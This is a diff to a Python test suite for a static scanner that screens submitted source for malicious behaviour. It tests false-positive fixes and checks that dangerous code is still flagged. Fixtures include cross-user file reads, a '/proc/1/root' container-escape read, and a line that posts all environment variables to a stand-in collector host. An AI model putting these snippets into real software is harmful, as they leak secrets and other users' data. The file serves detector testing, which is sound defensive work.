@@ -24,7 +24,6 @@ from ditto_screener.source_review import (
     OpenRouterSourceReviewAgent,
     TarSourceRepository,
     ledger_disposition,
-    substantiated_concern_count,
 )
 from ditto_screener.source_signals import (
     find_decisive_malicious_source,
@@ -36,6 +35,7 @@ from ditto_screening_protocol import (
     SourceReviewInvariant,
     SourceReviewInvariantDisposition,
 )
+from ditto_screening_protocol.review_ledger import substantiated_concern_count
 
 _SHA = "ab" * 32
 
@@ -1024,6 +1024,100 @@ def test_decisive_preflight_still_flags_targeted_wallet_reads() -> None:
     assert "data_exfiltration" in {item["category"] for item in findings}
 
 
+def test_decisive_preflight_allows_injected_endpoint_and_timeout_config() -> None:
+    """Endpoint and timeout configuration is not cross-user access.
+
+    Reproduces the #2099 hold class (observed on Sky v1) with sanitized,
+    representative configuration: no miner source is reproduced here. Two
+    ordinary shapes combined into a 100%-confidence pre-build quarantine --
+    `/host` inside the `http://host.docker.internal` authority satisfied the
+    filesystem-path role, and a declared `read_timeout` field satisfied the
+    access-effect role on a bare `\\w*` match. Neither is a read of another
+    user's data, and the hold landed before build, runtime-isolation, and tool
+    checks could run.
+    """
+    findings = find_decisive_malicious_source(
+        [
+            (
+                "src/inference/config.rs",
+                "use std::time::Duration;\n"
+                "pub struct InferenceConfig {\n"
+                "    pub base_url: String,\n"
+                "    pub read_timeout: Duration,\n"
+                "    pub write_timeout: Duration,\n"
+                "}\n"
+                "impl InferenceConfig {\n"
+                "    pub fn from_env() -> Self {\n"
+                '        let base_url = std::env::var("DITTO_INFERENCE_BASE_URL")\n'
+                "            .unwrap_or_else(|_| "
+                '"http://host.docker.internal:11434/v1".to_string());\n'
+                "        let read_timeout = Duration::from_secs(600);\n"
+                "        let write_timeout = Duration::from_secs(30);\n"
+                "        Self { base_url, read_timeout, write_timeout }\n"
+                "    }\n"
+                "}\n",
+            ),
+            (
+                "src/runtime.py",
+                "import os\n"
+                'BASE_URL = os.environ.get("DITTO_INFERENCE_BASE_URL",\n'
+                '                          "http://host.docker.internal:8000/v1")\n'
+                "READ_TIMEOUT_SECONDS = 600.0\n"
+                "def client():\n"
+                "    return OpenAiChatClient(base_url=BASE_URL,\n"
+                "                            read_timeout=READ_TIMEOUT_SECONDS)\n",
+            ),
+        ]
+    )
+
+    assert findings == []
+
+
+def test_decisive_preflight_still_flags_a_served_cross_user_read() -> None:
+    """A served read of another principal's files stays decisive.
+
+    The narrowing above removes a URL authority and a config field name; it
+    must not remove the shape the rule exists for. Each fixture reaches a real
+    filesystem location belonging to another user through a real read/walk
+    call, which is the S1 cross-user-access bar.
+    """
+    for path, source in (
+        (
+            "src/served/handler.rs",
+            'let other = request.query("peer_user");\n'
+            'let target = format!("/home/{}/.ditto/memory.json", other);\n'
+            "let borrowed = std::fs::read_to_string(&target)?;\n"
+            "Response::text(borrowed)\n",
+        ),
+        (
+            "src/harvest.rs",
+            'let base = "/Users/";\n'
+            "for entry in walkdir::WalkDir::new(base) {\n"
+            "    collected.push(entry?.path().to_path_buf());\n"
+            "}\n",
+        ),
+        (
+            "src/runtime.py",
+            'TARGET = "file:///home/otheruser/.ditto/memory.db"\n'
+            'blob = open(TARGET.removeprefix("file://"), "rb").read()\n',
+        ),
+        # URL schemes are case-insensitive, so an upper-case file URL names the
+        # same local path and must not be masked as a remote endpoint.
+        (
+            "src/served/upper.py",
+            'TARGET = "FILE:///home/other/.ditto/memory.db"\n'
+            'blob = open(TARGET.removeprefix("FILE://"), "rb").read()\n',
+        ),
+        (
+            "src/escape.rs",
+            'let host_copy = "/proc/1/root/home/other/notes";\n'
+            "let body = std::fs::read(host_copy)?;\n",
+        ),
+    ):
+        findings = find_decisive_malicious_source([(path, source)])
+        assert "cross_user_access" in {item["category"] for item in findings}, path
+
+
 def test_decisive_malicious_preflight_ignores_inert_regression_material() -> None:
     findings = find_decisive_malicious_source(
         [
@@ -1049,6 +1143,143 @@ def test_decisive_malicious_preflight_ignores_inert_regression_material() -> Non
         ]
     )
     assert findings == []
+
+
+@pytest.mark.parametrize("mode", ["off", "shadow", "enforce"])
+def test_rust_cfg_test_cross_user_fixture_does_not_hold_preflight(
+    tmp_path: Path, mode: str
+) -> None:
+    source = (
+        "fn main() { serve(); }\n"
+        "fn serve() { call_model(); }\n"
+        "#[cfg(test)]\n"
+        "mod tests {\n"
+        "    fn rejects_foreign_home() {\n"
+        '        let path = "/root/private";\n'
+        "        read(path);\n"
+        "    }\n"
+        "}\n"
+    )
+    repo = TarSourceRepository(
+        str(
+            _archive_files(
+                tmp_path,
+                {
+                    "Dockerfile": (
+                        b"FROM rust:bookworm AS build\nCOPY . .\n"
+                        b"RUN cargo build --release\nFROM scratch\n"
+                        b"COPY --from=build /target/release/app /app\n"
+                        b'ENTRYPOINT ["/app"]\n'
+                    ),
+                    "Cargo.toml": b"[package]\nname='app'\nversion='0.1.0'\n",
+                    "src/main.rs": source.encode(),
+                },
+            )
+        )
+    )
+
+    assert repo.malicious_preflight(artifact_sha256="a" * 64, mode=mode) is None
+
+
+def test_rust_cfg_test_does_not_hide_adjacent_served_cross_user_access() -> None:
+    source = (
+        "#[cfg(test)]\n"
+        "mod tests {\n"
+        '    fn local() { let path = "/root/test-fixture"; read(path); }\n'
+        "}\n"
+        'fn serve() { let path = "/root/private"; read(path); }\n'
+    )
+
+    findings = find_decisive_malicious_source([("src/baseline.rs", source)])
+
+    assert any(
+        finding["category"] == "cross_user_access"
+        and {item["line"] for item in finding["locations"]} == {5}
+        for finding in findings
+    )
+
+
+def test_rust_test_literal_brace_cannot_hide_following_served_item() -> None:
+    source = (
+        "#[cfg(test)]\n"
+        "mod tests {\n"
+        '    fn local() { let template = "{"; assert!(!template.is_empty()); }\n'
+        "}\n"
+        'fn serve() { let path = "/root/private"; read(path); }\n'
+    )
+
+    findings = find_decisive_malicious_source([("src/baseline.rs", source)])
+
+    assert any(
+        finding["category"] == "cross_user_access"
+        and {item["line"] for item in finding["locations"]} == {5}
+        for finding in findings
+    )
+
+
+def test_enforced_preflight_keeps_served_access_after_rust_test_literal(
+    tmp_path: Path,
+) -> None:
+    source = (
+        "#[cfg(test)]\n"
+        "mod tests {\n"
+        '    fn local() { let template = "{"; assert!(!template.is_empty()); }\n'
+        "}\n"
+        'fn serve() { let path = "/root/private"; read(path); }\n'
+        "fn main() { serve(); }\n"
+    )
+    archive = _archive_files(
+        tmp_path,
+        {
+            "Dockerfile": (
+                b"FROM rust:bookworm AS build\nCOPY . .\n"
+                b"RUN cargo build --release\nFROM scratch\n"
+                b"COPY --from=build /target/release/app /app\n"
+                b'ENTRYPOINT ["/app"]\n'
+            ),
+            "Cargo.toml": b"[package]\nname='app'\nversion='0.1.0'\n",
+            "src/main.rs": source.encode(),
+        },
+    )
+
+    observation = TarSourceRepository(str(archive)).malicious_preflight(
+        artifact_sha256="a" * 64, mode="enforce"
+    )
+
+    assert observation is not None
+    assert observation.finding is not None
+    assert observation.finding["prompt_revision"] == "static-malicious-preflight-v2"
+    assert observation.categories == ("cross_user_access",)
+    assert {item["line"] for item in observation.finding["evidence"]} == {5}
+
+
+def test_rust_attribute_text_inside_raw_string_cannot_hide_served_item() -> None:
+    source = (
+        'const GUIDE: &str = r#"\n#[cfg(test)]\nmod tests {\n"#;\n'
+        'fn serve() { let path = "/root/private"; read(path); }\n'
+    )
+
+    findings = find_decisive_malicious_source([("src/baseline.rs", source)])
+
+    assert any(
+        finding["category"] == "cross_user_access"
+        and {item["line"] for item in finding["locations"]} == {5}
+        for finding in findings
+    )
+
+
+@pytest.mark.parametrize(
+    "attribute",
+    ["#[cfg(not(test))]", '#[cfg(any(test, feature = "production"))]'],
+)
+def test_rust_cfg_branch_that_can_run_in_production_remains_decisive(
+    attribute: str,
+) -> None:
+    source = f'{attribute}\nfn serve() {{ let path = "/root/private"; read(path); }}\n'
+
+    findings = find_decisive_malicious_source([("src/baseline.rs", source)])
+
+    assert any(finding["category"] == "cross_user_access" for finding in findings)
 
 
 def test_decisive_preflight_ignores_nested_inert_regression_material() -> None:
@@ -1703,6 +1934,12 @@ def test_static_preflight_v2_sanitized_regression_corpus(
     assert audit[0]["candidate_revision"] == "static-malicious-preflight-v2"
     expected = case["expected"]
     category = case["category"]
+    if "reachability" in case:
+        assert any(
+            proof["category"] == category
+            and proof["reachability_state"] == case["reachability"]
+            for proof in audit[0]["proofs"]
+        )
     if expected == "decisive":
         assert observation is not None
         assert observation.finding is not None
@@ -1711,6 +1948,11 @@ def test_static_preflight_v2_sanitized_regression_corpus(
         )
         assert category in observation.categories
         assert audit[0]["candidate_decisive"] is True
+    elif expected == "none":
+        assert observation is None
+        assert audit[0]["legacy_decisive"] is False
+        assert audit[0]["candidate_decisive"] is False
+        assert audit[0]["advisory_count"] == 0
     elif audit[0]["legacy_requires_serial_review"]:
         assert observation is not None
         assert observation.finding is not None
@@ -1724,11 +1966,13 @@ def test_static_preflight_v2_sanitized_regression_corpus(
         assert int(audit[0]["advisory_count"]) >= 1
 
 
-def test_static_preflight_off_is_exact_legacy_default(tmp_path: Path) -> None:
+def test_static_preflight_off_retains_legacy_default_for_copied_source(
+    tmp_path: Path,
+) -> None:
     archive = _archive_files(
         tmp_path,
         {
-            "Dockerfile": b"FROM scratch\n",
+            "Dockerfile": b"FROM scratch\nCOPY src/main.rs /src/main.rs\n",
             "src/main.rs": (
                 b'let endpoint = "/var/run/docker.sock";\n'
                 b"connect_control_socket(endpoint);\n"
@@ -1750,7 +1994,7 @@ def test_static_preflight_off_is_exact_legacy_default(tmp_path: Path) -> None:
     )
 
 
-def test_static_preflight_shadow_preserves_legacy_authority_and_records_delta(
+def test_static_preflight_shadow_clears_proven_excluded_helper_and_records_delta(
     tmp_path: Path,
 ) -> None:
     archive = _archive_files(
@@ -1775,19 +2019,122 @@ def test_static_preflight_shadow_preserves_legacy_authority_and_records_delta(
         audit_recorder=audit.append,
     )
 
-    assert observation is not None
-    assert observation.finding is not None
-    assert observation.finding["prompt_revision"] == "static-malicious-preflight-v1"
+    assert observation is None
     assert audit == [
         {
             **audit[0],
             "mode": "shadow",
-            "legacy_decisive": True,
+            "legacy_decisive": False,
             "candidate_decisive": False,
         }
     ]
     assert audit[0]["advisory_count"] == 1
     assert audit[0]["proofs"][0]["reachability_state"] == "proven_inert"
+
+
+@pytest.mark.parametrize("mode", ["off", "enforce"])
+def test_static_preflight_clears_uncopied_rehearsal_after_secret_mount(
+    tmp_path: Path, mode: str
+) -> None:
+    archive = _archive_files(
+        tmp_path,
+        {
+            "Dockerfile": (
+                b"FROM rust:bookworm AS builder\nWORKDIR /app\n"
+                b"COPY Cargo.toml ./\n"
+                b"RUN --mount=type=secret,id=build_key cargo build --release\n"
+                b"COPY src ./src\nCOPY fixtures ./fixtures\n"
+                b"RUN --mount=type=secret,id=build_key cargo build --release\n"
+                b"FROM debian:bookworm-slim\n"
+                b"COPY --from=builder /app/target/release/miner /usr/local/bin/miner\n"
+                b"COPY fixtures ./fixtures\n"
+                b'ENTRYPOINT ["miner"]\n'
+            ),
+            "Cargo.toml": b'[package]\nname="miner"\nversion="0.1.0"\n',
+            "src/main.rs": b"fn main() {}\n",
+            "fixtures/model.bin": b"\x00\xff",
+            "scripts/local-rehearsal.py": (
+                b"import os, urllib.request\n"
+                b"with urllib.request.urlopen(\n"
+                b"    'https://example.invalid/public.json'\n"
+                b") as response:\n"
+                b"    dataset = response.read()\n"
+                b"environment = os.environ.copy()\n"
+                b"environment.pop('OPENROUTER_API_KEY', None)\n"
+            ),
+        },
+    )
+    repository = TarSourceRepository(str(archive))
+    assert repository.malicious_preflight(artifact_sha256="a" * 64, mode=mode) is None
+
+
+@pytest.mark.parametrize("mode", ["off", "enforce"])
+def test_static_preflight_clears_inference_url_and_read_timeout(
+    tmp_path: Path, mode: str
+) -> None:
+    archive = _archive_files(
+        tmp_path,
+        {
+            "Dockerfile": (
+                b"FROM python:3.12\nCOPY app /app/app\n"
+                b'ENTRYPOINT ["python", "/app/app/main.py"]\n'
+            ),
+            "app/main.py": (
+                b"from app.config import Settings\nprint(Settings.from_env())\n"
+            ),
+            "app/config.py": (
+                b"import os\nclass Settings:\n"
+                b"    @classmethod\n    def from_env(cls):\n"
+                b"        inference_url = os.environ.get(\n"
+                b"            'DITTOBENCH_INFERENCE_BASE_URL', 'http://host.docker.internal:11435/v1'\n"
+                b"        )\n"
+                b"        read_seconds = 120\n"
+                b"        return inference_url, read_seconds\n"
+            ),
+        },
+    )
+    assert (
+        TarSourceRepository(str(archive)).malicious_preflight(
+            artifact_sha256="a" * 64, mode=mode
+        )
+        is None
+    )
+
+
+@pytest.mark.parametrize(
+    ("category", "source"),
+    [
+        (
+            "data_exfiltration",
+            b"import os, requests\npayload = os.environ.copy()\n"
+            b"requests.post('https://collector.invalid/report', json=payload)\n",
+        ),
+        (
+            "cross_user_access",
+            b"path = '/home/another-user/private.txt'\n"
+            b"with open(path) as source:\n    print(source.read())\n",
+        ),
+    ],
+)
+@pytest.mark.parametrize("mode", ["off", "enforce"])
+def test_static_preflight_retains_reachable_unsafe_source(
+    tmp_path: Path, mode: str, category: str, source: bytes
+) -> None:
+    archive = _archive_files(
+        tmp_path,
+        {
+            "Dockerfile": (
+                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
+                b'ENTRYPOINT ["python", "/app/app.py"]\n'
+            ),
+            "app.py": source,
+        },
+    )
+    observation = TarSourceRepository(str(archive)).malicious_preflight(
+        artifact_sha256="a" * 64, mode=mode
+    )
+    assert observation is not None
+    assert category in observation.categories
 
 
 def test_static_preflight_enforce_routes_unresolved_v1_threat_to_serial_review(
